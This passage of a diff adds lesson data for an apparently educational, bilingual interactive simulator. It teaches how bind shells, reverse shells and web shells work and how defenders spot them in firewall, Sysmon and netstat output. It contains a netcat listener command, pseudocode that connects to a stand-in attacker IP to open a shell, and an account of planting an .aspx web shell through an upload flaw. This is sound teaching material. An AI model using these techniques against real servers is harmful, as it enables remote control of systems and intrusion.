+      k: [],
+      w: [lg('SYSMON', 'EID 1 · Image=C:\\Windows\\Temp\\payload.exe · ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe · User=IIS APPPOOL\\DefaultAppPool'), wc('netstat -ano | findstr :4444'), ns('bind-listen', ':4444')],
+    },
+    {
+      title: T('Primer intento: el firewall lo descarta', 'First attempt: the firewall drops it'),
+      what: T('Kali intenta conectar directamente a la IP pública del servidor, puerto 4444. Pero el firewall perimetral sólo publica 80 y 443: el SYN cae en la regla <i>deny</i> por defecto y se <b>descarta sin responder</b>. Kali reintenta y, al cabo de unos dos minutos, se rinde.',
+        'Kali tries to connect straight to the server’s public IP, port 4444. But the perimeter firewall only publishes 80 and 443: the SYN falls into the default <i>deny</i> rule and is <b>dropped without a reply</b>. Kali retries and gives up after about two minutes.'),
+      cmd: [{ who: 'k', text: NCV, tokens: NCV_TOK }],
+      why: T('Un firewall que hace DROP no contesta: ni SYN-ACK ni RST. Kali sólo ve silencio y expira (<i>timed out</i>). “Refused” llegaría si el paquete alcanzara el host y no hubiera nadie escuchando: el host respondería RST. Es la diferencia entre un puerto <i>filtered</i> y uno <i>closed</i> en Nmap. Los mensajes son los de netcat-traditional, el <code>nc</code> predeterminado en Kali; ncat y OpenBSD nc los redactan distinto.',
+        'A firewall that DROPs does not answer: no SYN-ACK, no RST. Kali only sees silence and times out. “Refused” would arrive if the packet reached the host and nobody was listening: the host would answer RST. It is the same difference as a <i>filtered</i> versus a <i>closed</i> port in Nmap. The messages shown are those of netcat-traditional, the default <code>nc</code> on Kali; ncat and OpenBSD nc word them differently.'),
+      predict: {
+        q: T('Kali muestra un mensaje. ¿Cuál?', 'Kali prints a message. Which one?'),
+        opts: [T('Connection refused', 'Connection refused'), T('Connection timed out', 'Connection timed out'), T('Connection reset by peer', 'Connection reset by peer')],
+        ok: 1,
+        why: T('El DROP no genera respuesta alguna, así que el cliente espera y expira. Rechazo y reset implican que alguien contestó con un RST.', 'DROP produces no reply at all, so the client waits and times out. Refused and reset both imply that somebody answered with an RST.'),
+      },
+      def: T('El firewall registra el intento: tres SYN en segundos a un puerto no publicado. Es una alerta temprana barata, porque ningún usuario legítimo tiene motivo para llamar a ese puerto.', 'The firewall logs the attempt: three SYNs within seconds to an unpublished port. It is a cheap early warning, since no legitimate user has any reason to call that port.'),
+      scene: { fwBlock: true, fwHit: 'in-deny', hl: ['fw'], chips: { k2: { t: 'timed out', c: 'bad' } } },
+      anim: [{ pk: 'k>w', lane: 'shell', label: 'SYN', stop: 'fw' }, { wait: 450 }, { pk: 'k>w', lane: 'shell', label: 'SYN (retx)', stop: 'fw' }, { wait: 450 }, { pk: 'k>w', lane: 'shell', label: 'SYN (retx)', stop: 'fw' }],
+      k: [kc(NCV), o('(UNKNOWN) [198.51.100.10] 4444 (?) : Connection timed out')],
+      w: [lg('FW', 'DENY  tcp 203.0.113.50:51820 → 198.51.100.10:4444 · default deny inbound · x3 (SYN retransmissions)')],
+    },
+    {
+      title: T('Con la entrada abierta: el saludo de tres vías', 'With the inbound open: the three-way handshake'),
+      what: T('Imagina que alguien abrió TCP/4444 de entrada (una regla “temporal” que nadie retiró), o que el atacante está en la misma red y no hay firewall en medio. Ahora el SYN llega al socket en LISTEN, el servidor contesta SYN-ACK y Kali cierra con ACK. En ese instante <code>accept()</code> devuelve y existe una conexión TCP: un canal de bytes en ambos sentidos. Todavía <b>no hay shell</b>, sólo bytes.',
+        'Imagine somebody opened inbound TCP/4444 (a “temporary” rule nobody removed), or that the attacker sits on the same network with no firewall in between. Now the SYN reaches the socket in LISTEN, the server answers SYN-ACK and Kali closes with ACK. At that instant <code>accept()</code> returns and a TCP connection exists: a byte channel in both directions. There is <b>still no shell</b>, only bytes.'),
+      cmd: [{ who: 'k', text: NCV, tokens: NCV_TOK }],
+      why: T('SYN: “quiero hablar; mi número de secuencia inicial es x”. SYN-ACK: “recibido; el mío es y y espero x+1”. ACK: “recibido; espero y+1”. Con esos tres mensajes ambos lados acuerdan números de secuencia, que es la base de la entrega fiable y ordenada de TCP.',
+        'SYN: “I want to talk; my initial sequence number is x”. SYN-ACK: “received; mine is y and I expect x+1”. ACK: “received; I expect y+1”. With those three messages both sides agree on sequence numbers, which is the basis of TCP’s reliable, ordered delivery.'),
+      def: T('Ahora hay evidencia fuerte: el firewall permite 4444 desde una IP desconocida, Sysmon (evento 3, <code>Initiated=false</code>) registra a payload.exe aceptando una conexión y netstat muestra ESTABLISHED.', 'Now there is strong evidence: the firewall allows 4444 from an unknown IP, Sysmon (event 3, <code>Initiated=false</code>) records payload.exe accepting a connection and netstat shows ESTABLISHED.'),
+      scene: { openPort: 4444, fwBlock: false, fwHit: 'in4444', fwState: '203.0.113.50:51822 ⇄ 10.0.0.20:4444', conn: { lane: 'shell', label: 'TCP 4444' }, chips: { k2: { t: 'ESTABLISHED', c: 'on' }, w1: { t: 'ESTABLISHED\n:4444', c: 'on' } }, hl: ['fw'] },
+      anim: [{ pk: 'k>w', lane: 'shell', label: 'SYN' }, { pk: 'w>k', lane: 'shell', label: 'SYN-ACK' }, { pk: 'k>w', lane: 'shell', label: 'ACK' }],
+      k: [kc(NCV), o('(UNKNOWN) [198.51.100.10] 4444 (?) open')],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:51822 → 198.51.100.10:4444 · rule IN allow tcp 4444 (temporary)'), lg('SYSMON', 'EID 3 · Image=C:\\Windows\\Temp\\payload.exe · Initiated=false · SourceIp=203.0.113.50 · SourcePort=51822 · DestinationIp=10.0.0.20 · DestinationPort=4444'), wc('netstat -ano | findstr :4444'), ns('bind-est', ':4444')],
+    },
+    {
+      title: T('Conectar cmd.exe al socket', 'Wire cmd.exe to the socket'),
+      what: T('Una conexión TCP no es una shell. El payload lanza <code>cmd.exe</code> y le entrega el socket como <b>entrada estándar, salida estándar y salida de error</b>. cmd.exe no sabe nada de redes: lee de “su teclado” y escribe en “su pantalla”, y esos cables ahora son el socket. Lo que escribes en Kali viaja como bytes hasta stdin; lo que cmd imprime vuelve por el mismo socket. Tu terminal de Kali hace el eco de lo que tecleas.',
+        'A TCP connection is not a shell. The payload launches <code>cmd.exe</code> and hands it the socket as <b>standard input, standard output and standard error</b>. cmd.exe knows nothing about networks: it reads from “its keyboard” and writes to “its screen”, and those wires are now the socket. What you type in Kali travels as bytes to stdin; what cmd prints comes back over the same socket. Your Kali terminal does the echo of what you type.'),
+      cmd: [{ who: 'ps', text: PIPE_PSEUDO }],
+      predict: {
+        q: T('¿Qué hace que lo que tecleas en Kali llegue a cmd.exe?', 'What makes what you type in Kali reach cmd.exe?'),
+        opts: [T('cmd.exe contiene código de red.', 'cmd.exe contains networking code.'), T('Su entrada estándar está conectada al socket.', 'Its standard input is wired to the socket.'), T('El firewall reenvía las pulsaciones.', 'The firewall forwards the keystrokes.')],
+        ok: 1,
+        why: T('Es el mismo cmd.exe de siempre. Sólo cambia hacia dónde apuntan sus tres “cables” (stdin, stdout, stderr). Por eso una bind y una reverse shell son idénticas una vez conectadas.', 'It is the same old cmd.exe. Only the targets of its three “wires” (stdin, stdout, stderr) change. That is why a bind and a reverse shell are identical once connected.'),
+      },
+      def: T('Observa la cadena padre→hijo: w3wp.exe → payload.exe → cmd.exe. Un servidor web casi nunca debería lanzar un intérprete de comandos: es una de las detecciones de mayor fidelidad (Sysmon evento 1, o evento 4688 de Windows con auditoría de línea de comandos).', 'Look at the parent→child chain: w3wp.exe → payload.exe → cmd.exe. A web server should almost never launch a command interpreter: it is one of the highest-fidelity detections (Sysmon event 1, or Windows event 4688 with command-line auditing).'),
+      scene: { rows: { C: ROW_CMD }, pipe: true, hl: ['w'] },
+      anim: [{ pulse: ['B'] }, { pulse: ['C'] }, { pk: 'w>k', lane: 'shell', label: 'banner' }],
+      k: [...BANNER, rp(CWD0 + '>')],
+      w: [lg('SYSMON', 'EID 1 · Image=C:\\Windows\\System32\\cmd.exe · ParentImage=C:\\Windows\\Temp\\payload.exe · User=IIS APPPOOL\\DefaultAppPool')],
+    },
+    {
+      title: T('Tu turno: usa la shell', 'Your turn: use the shell'),
+      what: T('La shell está viva. Escribe en la terminal de Kali (o pulsa un ejercicio para cargarlo) y observa el panel del defensor: <b>cada comando deja rastro</b>. Fíjate también en qué comandos crean un proceso nuevo (<code>whoami.exe</code>) y cuáles son internos de cmd.exe (<code>cd</code>, <code>dir</code>).',
+        'The shell is alive. Type in the Kali terminal (or click an exercise to load it) and watch the defender panel: <b>every command leaves a trace</b>. Notice also which commands create a new process (<code>whoami.exe</code>) and which are internal to cmd.exe (<code>cd</code>, <code>dir</code>).'),
+      live: 'shell',
+      tasks: LIVE_TASKS_SHELL('bind'),
+      scene: { hl: ['k', 'w'] },
+      anim: [],
+      k: [], w: [],
+    },
+    {
+      title: T('Qué te llevas y cómo se defiende', 'Takeaways and defenses'),
+      points: [
+        T('<b>Bind = el servidor escucha y el atacante conecta.</b> El primer SYN va de Internet hacia la DMZ.', '<b>Bind = the server listens and the attacker connects.</b> The first SYN goes from the Internet toward the DMZ.'),
+        T('Necesita una <b>entrada permitida</b> en el puerto elegido, tanto en el firewall perimetral como en el de Windows. Por eso rara vez funciona a través de Internet.', 'It needs an <b>allowed inbound</b> on the chosen port, in both the perimeter firewall and the Windows one. That is why it rarely works across the Internet.'),
+        T('Una shell son tres piezas: un <b>socket</b> TCP, un <b>intérprete</b> (cmd.exe) y la <b>redirección</b> de E/S entre ambos.', 'A shell is three pieces: a TCP <b>socket</b>, an <b>interpreter</b> (cmd.exe) and the <b>I/O redirection</b> between them.'),
+        T('Los síntomas dicen dónde falla: <i>timed out</i> = algo descarta paquetes; <i>refused</i> = llegaste al host y nadie escucha.', 'The symptoms tell you where it fails: <i>timed out</i> = something drops packets; <i>refused</i> = you reached the host and nobody listens.'),
+      ],
+      defList: [
+        T('Denegar por defecto el tráfico entrante y publicar sólo lo imprescindible.', 'Deny inbound traffic by default and publish only what is essential.'),
+        T('Mantener activo el firewall de host: un proceso que escucha en un puerto nuevo no debe ser alcanzable sin una regla explícita.', 'Keep the host firewall on: a process listening on a new port must not be reachable without an explicit rule.'),
+        T('Alertar por puertos nuevos en LISTEN y por hijos inesperados de w3wp.exe.', 'Alert on new LISTEN ports and on unexpected children of w3wp.exe.'),
+        T('Segmentar la red: limitar qué orígenes pueden alcanzar qué puertos, también dentro de la LAN.', 'Segment the network: limit which sources can reach which ports, inside the LAN too.'),
+      ],
+      scene: { hl: [] }, anim: [], k: [], w: [],
+    },
+  ],
+};
+
+/* ------------------------------------------------------------- REVERSE */
+STAGES.reverse = {
+  name: T('Reverse shell', 'Reverse shell'),
+  goal: T('El atacante escucha y es el servidor quien se conecta hacia fuera.', 'The attacker listens and it is the server that connects outward.'),
+  steps: [
+    {
+      title: T('Punto de partida: la misma falla, la lectura correcta del firewall', 'Starting point: same flaw, reading the firewall correctly'),
+      what: T('Mismo escenario: el atacante puede ejecutar un programa en el servidor. Mira las reglas del firewall: entrada <b>denegada</b> salvo 80 y 443; salida <b>permitida</b> (política típica: los servidores necesitan actualizarse, resolver DNS y hablar con APIs). Esa asimetría es la que explota una reverse shell.',
+        'Same scenario: the attacker can run a program on the server. Look at the firewall rules: inbound <b>denied</b> except 80 and 443; outbound <b>allowed</b> (typical policy: servers need to update, resolve DNS and call APIs). That asymmetry is what a reverse shell exploits.'),
+      predict: {
+        q: T('Con la entrada denegada y la salida permitida, ¿quién debería “escuchar”?', 'With inbound denied and outbound allowed, who should “listen”?'),
+        opts: [T('El servidor, igual que antes.', 'The server, as before.'), T('El atacante: así la conexión TCP nace desde dentro y sale.', 'The attacker: that way the TCP connection starts inside and goes out.'), T('Ninguno: no es posible.', 'Neither: it is not possible.')],
+        ok: 1,
+        why: T('Si el atacante escucha, el primer SYN viaja de dentro hacia fuera, que es justo lo que el firewall permite.', 'If the attacker listens, the first SYN travels from inside to outside, which is exactly what the firewall allows.'),
+      },
+      def: T('Una política de salida “permitir todo” en un servidor es el verdadero fallo de diseño aquí. Los servidores casi nunca necesitan llegar a cualquier destino de Internet.', 'An “allow everything” outbound policy on a server is the real design flaw here. Servers almost never need to reach any destination on the Internet.'),
+      scene: { rows: { A: ROW_A }, fwHit: 'out', hl: ['fw'] },
+      anim: [EXPLOIT_PKT, { pulse: ['A'] }, { pk: 'w>k', lane: 'http', label: '200 OK' }],
+      k: [],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:50412 → 198.51.100.10:443 · rule IN allow tcp 80,443'), lg('IIS', '2026-10-23 14:58:03 10.0.0.20 POST /portal/export - 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 212')],
+    },
+    {
+      title: T('El atacante levanta el listener primero', 'The attacker starts the listener first'),
+      what: T('Los papeles se invierten: ahora es <b>Kali</b> quien escucha. Debe estar listo <i>antes</i> de ejecutar el payload; si no, el SYN del servidor llegaría a un puerto cerrado y recibiría un RST (“connection refused”). Además, la IP del atacante tiene que ser alcanzable desde el servidor: aquí es pública (203.0.113.50). Un Kali en una LAN doméstica con IP privada necesitaría una redirección de puertos o un VPS.',
+        'The roles flip: now <b>Kali</b> is the one listening. It must be ready <i>before</i> the payload runs; otherwise the server’s SYN would hit a closed port and get an RST (“connection refused”). Also, the attacker’s IP must be reachable from the server: here it is public (203.0.113.50). A Kali on a home LAN with a private IP would need port forwarding or a VPS.'),
+      cmd: [{ who: 'k', text: 'nc -lvnp 4444', tokens: [
+        ['nc', T('Netcat, ahora en modo servidor.', 'Netcat, now in server mode.')],
+        ['-lvnp', T('-l: escuchar (listen) en vez de conectar. -v: verboso. -n: sin DNS. -p: el siguiente argumento es el puerto.', '-l: listen instead of connecting. -v: verbose. -n: no DNS. -p: the next argument is the port.')],
+        ['4444', T('Puerto local en el que Kali espera la llamada del servidor.', 'Local port where Kali waits for the server’s call.')],
+      ] }],
+      predict: {
+        q: T('Antes de ejecutar el payload en la víctima, ¿qué debe estar listo?', 'Before running the payload on the victim, what must be ready?'),
+        opts: [T('El listener en Kali.', 'The listener on Kali.'), T('Una regla de entrada en el firewall de ACME.', 'An inbound rule on ACME’s firewall.'), T('Nada: el orden da igual.', 'Nothing: order does not matter.')],
+        ok: 0,
+        why: T('El payload hace connect() hacia Kali. Si nadie escucha, Kali responde RST y la conexión falla al instante. La regla de entrada no hace falta: la conexión nace desde dentro.', 'The payload calls connect() toward Kali. If nobody listens, Kali answers RST and the connection fails instantly. No inbound rule is needed: the connection starts from inside.'),
+      },
+      scene: { kSock: true, chips: { k1: { t: 'LISTEN\n0.0.0.0:4444', c: 'listen' } }, hl: ['k'] },
+      anim: [{ pulse: ['K'] }],
+      k: [kc('nc -lvnp 4444'), o('listening on [any] 4444 ...')],
+      w: [],
+    },
+    {
+      title: T('El payload se ejecuta y “llama a casa”', 'The payload runs and “phones home”'),
+      what: T('El mismo exploit vuelve a entrar por 443. Esta vez el payload sólo necesita <code>connect()</code> hacia la dirección del atacante, que va <b>incrustada</b> en el payload (en Metasploit son LHOST y LPORT). No hay <code>bind</code> ni <code>listen</code>: el servidor <b>no abre ningún puerto en escucha</b>.',
+        'The same exploit comes in over 443 again. This time the payload only needs <code>connect()</code> toward the attacker’s address, which is <b>embedded</b> in the payload (in Metasploit they are LHOST and LPORT). There is no <code>bind</code> or <code>listen</code>: the server <b>opens no listening port</b>.'),
+      cmd: [{ who: 'ps', text: T('s = socket(TCP)\nconnect(s, 203.0.113.50:4444)   # IP:puerto del atacante, fijados al crear el payload',
+        's = socket(TCP)\nconnect(s, 203.0.113.50:4444)   # attacker IP:port, fixed when the payload was built') }],
+      why: T('Como no llama a <code>bind()</code>, el sistema operativo asigna un puerto de origen <b>efímero</b> (rango 49152–65535 en Windows), por ejemplo 49734. Ese número lo verás en netstat y en la tabla de estado del firewall.', 'Because it does not call <code>bind()</code>, the operating system picks an <b>ephemeral</b> source port (range 49152–65535 on Windows), for example 49734. You will see that number in netstat and in the firewall’s state table.'),
+      def: T('Aquí no hay ningún puerto nuevo en LISTEN: la señal es de comportamiento. Un servidor web lanza un proceso que abre una conexión saliente hacia una IP que nadie había visto.', 'There is no new LISTEN port here: the signal is behavioral. A web server launches a process that opens an outbound connection to an IP nobody has seen before.'),
+      scene: { rows: { B: ROW_PAYLOAD }, wSock: true, chips: { w1: { t: 'connect()\n→ :4444', c: 'syn' } }, hl: ['w'] },
+      anim: [EXPLOIT_PKT, { pulse: ['A'] }, { pulse: ['B'] }],
+      k: [],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:50418 → 198.51.100.10:443 · rule IN allow tcp 80,443'), lg('SYSMON', 'EID 1 · Image=C:\\Windows\\Temp\\payload.exe · ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe · User=IIS APPPOOL\\DefaultAppPool')],
+    },
+    {
+      title: T('SYN hacia fuera: el firewall abre una entrada de estado', 'Outbound SYN: the firewall creates a state entry'),
+      what: T('El servidor envía el SYN desde 10.0.0.20:49734 hacia Kali:4444. Para el firewall es una conexión <b>nueva saliente</b>: la regla OUT la permite, crea una entrada en su tabla de estado y traduce la IP de origen (NAT) a su IP pública. Cuando Kali responde SYN-ACK, el paquete coincide con esa entrada y entra aunque “la entrada esté denegada”. Llega el ACK y <code>accept()</code> en Kali devuelve la conexión.',
+        'The server sends the SYN from 10.0.0.20:49734 to Kali:4444. To the firewall it is a <b>new outbound</b> connection: the OUT rule allows it, it creates an entry in its state table and translates the source IP (NAT) to its public IP. When Kali answers SYN-ACK, the packet matches that entry and gets in even though “inbound is denied”. The ACK arrives and <code>accept()</code> on Kali returns the connection.'),
+      why: T('Un firewall con estado identifica cada flujo por (IP origen, puerto origen, IP destino, puerto destino, protocolo). Las respuestas de un flujo ya registrado se permiten automáticamente; un SYN-ACK suelto, sin entrada previa, se descartaría.', 'A stateful firewall identifies each flow by (source IP, source port, destination IP, destination port, protocol). Replies to a flow already on record are allowed automatically; a stray SYN-ACK with no prior entry would be dropped.'),
+      predict: {
+        q: T('Kali recibe la conexión. ¿Desde qué IP la ve?', 'Kali receives the connection. From which IP does it see it?'),
+        opts: [T('10.0.0.20 (IP privada del servidor).', '10.0.0.20 (the server’s private IP).'), T('198.51.100.10 (IP pública del firewall).', '198.51.100.10 (the firewall’s public IP).'), T('203.0.113.50 (la propia Kali).', '203.0.113.50 (Kali itself).')],
+        ok: 1,
+        why: T('Las IP privadas no se enrutan por Internet; el firewall las reemplaza (SNAT) por su IP pública. Para Kali, el “servidor” es el firewall. Dato útil para el atacante y para el defensor: el 10.0.0.20 real sólo aparece en los logs internos.', 'Private IPs are not routed across the Internet; the firewall replaces them (SNAT) with its public IP. To Kali, the “server” is the firewall. Useful for the attacker and for the defender: the real 10.0.0.20 only appears in internal logs.'),
+      },
+      def: T('Tres lugares ven la misma conexión con distintos ojos: el firewall (ALLOW saliente + NAT), el host (Sysmon evento 3 con <code>Initiated=true</code>) y netstat (ESTABLISHED con puerto local efímero).', 'Three places see the same connection through different eyes: the firewall (outbound ALLOW + NAT), the host (Sysmon event 3 with <code>Initiated=true</code>) and netstat (ESTABLISHED with an ephemeral local port).'),
+      scene: { fwHit: 'out', fwState: '10.0.0.20:49734 → 203.0.113.50:4444\nSNAT 198.51.100.10:49734', conn: { lane: 'shell', label: 'TCP 4444' }, chips: { k1: null, k2: { t: 'ESTABLISHED', c: 'on' }, w1: { t: 'ESTABLISHED\n:49734', c: 'on' } }, hl: ['fw'] },
+      anim: [{ pk: 'w>k', lane: 'shell', label: 'SYN' }, { pk: 'k>w', lane: 'shell', label: 'SYN-ACK' }, { pk: 'w>k', lane: 'shell', label: 'ACK' }],
+      k: [o('connect to [203.0.113.50] from (UNKNOWN) [198.51.100.10] 49734')],
+      w: [lg('FW', 'ALLOW tcp 10.0.0.20:49734 → 203.0.113.50:4444 · rule OUT allow any · SNAT 198.51.100.10:49734'), lg('SYSMON', 'EID 3 · Image=C:\\Windows\\Temp\\payload.exe · Initiated=true · SourceIp=10.0.0.20 · SourcePort=49734 · DestinationIp=203.0.113.50 · DestinationPort=4444'), wc('netstat -ano | findstr :4444'), ns('rev-est', ':4444')],
+    },
+    {
+      title: T('Conectar cmd.exe al socket', 'Wire cmd.exe to the socket'),
+      what: T('Ya hay conexión TCP, pero aún no hay shell. Igual que en la bind shell, el payload lanza <code>cmd.exe</code> con el socket como stdin, stdout y stderr. <b>Desde este punto bind y reverse son indistinguibles</b>: sólo cambió quién llamó a quién.',
+        'There is a TCP connection but no shell yet. Just like in the bind shell, the payload launches <code>cmd.exe</code> with the socket as stdin, stdout and stderr. <b>From this point on, bind and reverse are indistinguishable</b>: only who called whom has changed.'),
+      cmd: [{ who: 'ps', text: PIPE_PSEUDO }],
+      predict: {
+        q: T('Ya hay conexión TCP. ¿Qué falta para tener una shell?', 'There is a TCP connection. What is missing to have a shell?'),
+        opts: [T('Abrir otro puerto.', 'Opening another port.'), T('Que cmd.exe lea y escriba a través del socket.', 'That cmd.exe reads and writes through the socket.'), T('Nada: una conexión TCP ya es una shell.', 'Nothing: a TCP connection already is a shell.')],
+        ok: 1,
+        why: T('TCP sólo transporta bytes. La shell aparece cuando esos bytes alimentan el stdin de un intérprete y su stdout vuelve por el mismo camino.', 'TCP only carries bytes. The shell appears when those bytes feed an interpreter’s stdin and its stdout returns the same way.'),
+      },
+      def: T('La cadena w3wp.exe → payload.exe → cmd.exe aparece exactamente igual que en la bind shell. La detección basada en procesos no distingue entre ambas.', 'The chain w3wp.exe → payload.exe → cmd.exe looks exactly like in the bind shell. Process-based detection does not tell them apart.'),
+      scene: { rows: { C: ROW_CMD }, pipe: true, hl: ['w'] },
+      anim: [{ pulse: ['B'] }, { pulse: ['C'] }, { pk: 'w>k', lane: 'shell', label: 'banner' }],
+      k: [...BANNER, rp(CWD0 + '>')],
+      w: [lg('SYSMON', 'EID 1 · Image=C:\\Windows\\System32\\cmd.exe · ParentImage=C:\\Windows\\Temp\\payload.exe · User=IIS APPPOOL\\DefaultAppPool')],
+    },
+    {
+      title: T('Tu turno: usa la shell', 'Your turn: use the shell'),
+      what: T('La sesión está viva y es <b>saliente</b>. Escribe en la terminal de Kali (o pulsa un ejercicio) y compara el rastro con el de la bind shell: el netstat del servidor ya no muestra un puerto en LISTEN, sino una conexión con puerto local efímero hacia tu Kali.',
+        'The session is alive and it is <b>outbound</b>. Type in the Kali terminal (or click an exercise) and compare the trace with the bind shell’s: the server’s netstat no longer shows a LISTEN port but a connection with an ephemeral local port toward your Kali.'),
+      live: 'shell',
+      tasks: LIVE_TASKS_SHELL('reverse'),
+      scene: { hl: ['k', 'w'] }, anim: [], k: [], w: [],
+    },
+    {
+      title: T('Qué te llevas y cómo se defiende', 'Takeaways and defenses'),
+      points: [
+        T('<b>Reverse = el atacante escucha y el servidor conecta.</b> El primer SYN va de la DMZ hacia Internet.', '<b>Reverse = the attacker listens and the server connects.</b> The first SYN goes from the DMZ toward the Internet.'),
+        T('Aprovecha la asimetría “entrada denegada, salida permitida”: el firewall acepta la respuesta gracias a su tabla de estado.', 'It exploits the “inbound denied, outbound allowed” asymmetry: the firewall accepts the reply thanks to its state table.'),
+        T('Requiere dos cosas: una IP del atacante <b>alcanzable</b> y un puerto de salida <b>permitido</b>. Elegir 443 es popular porque casi siempre se deja salir (pruébalo en el Laboratorio).', 'It needs two things: an attacker IP that is <b>reachable</b> and an outbound port that is <b>allowed</b>. Choosing 443 is popular because it is almost always let out (try it in the Lab).'),
+        T('Para el atacante, la víctima es la IP pública del firewall; la IP privada sólo existe en los logs internos.', 'To the attacker, the victim is the firewall’s public IP; the private IP only exists in internal logs.'),
+      ],
+      defList: [
+        T('Filtrado de salida (egress) con política de denegar por defecto en servidores, con una lista corta de destinos permitidos.', 'Egress filtering with default-deny on servers, with a short list of allowed destinations.'),
+        T('Salida sólo a través de un proxy autenticado; en 443, inspección TLS o al menos reputación y categorización de destinos.', 'Outbound only through an authenticated proxy; on 443, TLS inspection or at least destination reputation and categorization.'),
+        T('Sysmon evento 3 / EDR: alertar cuando w3wp.exe, cmd.exe o powershell.exe abren conexiones salientes.', 'Sysmon event 3 / EDR: alert when w3wp.exe, cmd.exe or powershell.exe open outbound connections.'),
+        T('No confíes en el puerto: “443 saliente” puede ser cualquier cosa. Mira destino, frecuencia (beaconing) y proceso.', 'Do not trust the port: “outbound 443” can be anything. Look at destination, frequency (beaconing) and process.'),
+      ],
+      scene: { hl: [] }, anim: [], k: [], w: [],
+    },
+  ],
+};
+
+
+/* ============ Web shell stage: concept, request cycle and defender view (no command-execution demo) ============ */
+const IIS_PFX = '2026-10-23 ';
+STAGES.web = {
+  name: T('Web shell', 'Web shell'),
+  goal: T('Un script colocado en el sitio convierte al propio servidor web en el canal de control.', 'A script planted on the site turns the web server itself into the control channel.'),
+  steps: [
+    {
+      title: T('Punto de partida: una función de subida sin controles', 'Starting point: an upload feature without controls'),
+      what: T('Aquí no hay ejecución de código previa: la falla es de <b>lógica de aplicación</b>. El portal ofrece “Subir comprobante” y guarda lo que recibe dentro de la raíz web (<code>/uploads/</code>), una carpeta que IIS puede servir <i>y</i> en la que puede ejecutar scripts. Esta clase de falla se conoce como <b>carga de archivos sin restricciones</b> (<i>unrestricted file upload</i>, OWASP). Dos descuidos típicos: confiar en el tipo o la extensión que declara el cliente, y guardar los archivos en una ruta ejecutable.',
+        'There is no prior code execution here: the flaw is in <b>application logic</b>. The portal offers “Upload receipt” and stores whatever it receives inside the web root (<code>/uploads/</code>), a folder IIS can serve <i>and</i> in which it can run scripts. This flaw class is called <b>unrestricted file upload</b> (OWASP). Two typical oversights: trusting the type or extension the client declares, and saving files in an executable path.'),
+      why: T('Que un archivo llegue al servidor no significa que se ejecute. IIS decide por la <b>extensión</b> y el <b>mapeo de manejadores</b> (<i>handler mapping</i>) de cada carpeta: un <code>.pdf</code> se sirve como archivo estático; un <code>.aspx</code> se entrega al motor de ASP.NET, que lo ejecuta. Si se pueden mezclar ambos mundos en la misma carpeta, aparece el problema.',
+        'A file reaching the server does not mean it gets executed. IIS decides by <b>extension</b> and the folder’s <b>handler mapping</b>: a <code>.pdf</code> is served as a static file; an <code>.aspx</code> is handed to the ASP.NET engine, which runs it. When both worlds can be mixed in the same folder, the problem appears.'),
+      def: T('Esta es la etapa más barata de corregir: validar el contenido (no sólo la cabecera), permitir una lista corta de extensiones, renombrar el archivo y guardarlo donde no se ejecute nada.', 'This is the cheapest stage to fix: validate the content (not just the header), allow a short list of extensions, rename the file and store it where nothing executes.'),
+      scene: { rows: { A: ROW_A }, fwHit: 'in80', hl: ['w'] },
+      anim: [{ pk: 'k>w', lane: 'http', label: 'GET /portal/upload' }, { pulse: ['A'] }, { pk: 'w>k', lane: 'http', label: T('formulario', 'form') }],
+      k: [],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:50601 → 198.51.100.10:443 · rule IN allow tcp 80,443'), lg('IIS', IIS_PFX + '15:01:07 10.0.0.20 GET /portal/upload.aspx - 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 31')],
+    },
+    {
+      title: T('Qué es una web shell', 'What a web shell is'),
+      what: T('Una <b>web shell</b> es un script del lado del servidor que se coloca en el sitio y que acepta instrucciones recibidas por HTTP(S), las ejecuta en el sistema operativo del servidor y devuelve el resultado en la respuesta. Para llegar ahí, el atacante primero tiene que lograr que el servidor <b>guarde</b> ese script en una ruta donde IIS lo <b>ejecute</b>. En la simulación aparece como un archivo con apariencia inocente en <code>/uploads/</code>.',
+        'A <b>web shell</b> is a server-side script placed on the site that accepts instructions received over HTTP(S), runs them on the server’s operating system and returns the result in the response. To get there, the attacker first has to make the server <b>store</b> that script in a path where IIS will <b>execute</b> it. In the simulation it shows up as an innocent-looking file in <code>/uploads/</code>.'),
+      predict: {
+        q: T('¿Qué debe ocurrir para que un archivo subido funcione como web shell?', 'What has to happen for an uploaded file to work as a web shell?'),
+        opts: [T('Que el servidor lo ejecute cuando alguien lo pida.', 'That the server executes it when somebody requests it.'), T('Que el antivirus lo apruebe.', 'That the antivirus approves it.'), T('Que se abra un puerto nuevo en el firewall.', 'That a new port opens on the firewall.')],
+        ok: 0,
+        why: T('Subir no es ejecutar. Se convierte en shell cuando IIS lo pasa a un manejador (ASP.NET para .aspx) en lugar de servirlo como archivo estático. No hace falta ningún puerto nuevo: el sitio ya escucha en 443.', 'Uploading is not executing. It becomes a shell when IIS hands it to a handler (ASP.NET for .aspx) instead of serving it as a static file. No new port is needed: the site already listens on 443.'),
+      },
+      def: T('Sysmon evento 11 (<i>FileCreate</i>) registra a <code>w3wp.exe</code> creando un <code>.aspx</code> nuevo en la raíz web. Un monitor de integridad de archivos (FIM) lo marcaría de inmediato.', 'Sysmon event 11 (<i>FileCreate</i>) records <code>w3wp.exe</code> creating a new <code>.aspx</code> in the web root. A file-integrity monitor (FIM) would flag it right away.'),
+      scene: { rows: { B: { t1: 'img_0412.aspx', t2: T('/uploads/ · del atacante', '/uploads/ · attacker’s') } }, hl: ['w'] },
+      anim: [{ pk: 'k>w', lane: 'http', label: T('POST · archivo', 'POST · file') }, { pulse: ['A'] }, { pulse: ['B'] }, { pk: 'w>k', lane: 'http', label: '200 OK' }],
+      k: [],
+      w: [lg('IIS', IIS_PFX + '15:02:19 10.0.0.20 POST /portal/upload.aspx - 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 88'), lg('SYSMON', 'EID 11 · Image=C:\\Windows\\System32\\inetsrv\\w3wp.exe · TargetFilename=C:\\inetpub\\wwwroot\\uploads\\img_0412.aspx')],
+    },
+    {
+      title: T('El ciclo petición → respuesta (sin sesión)', 'The request → response cycle (no session)'),
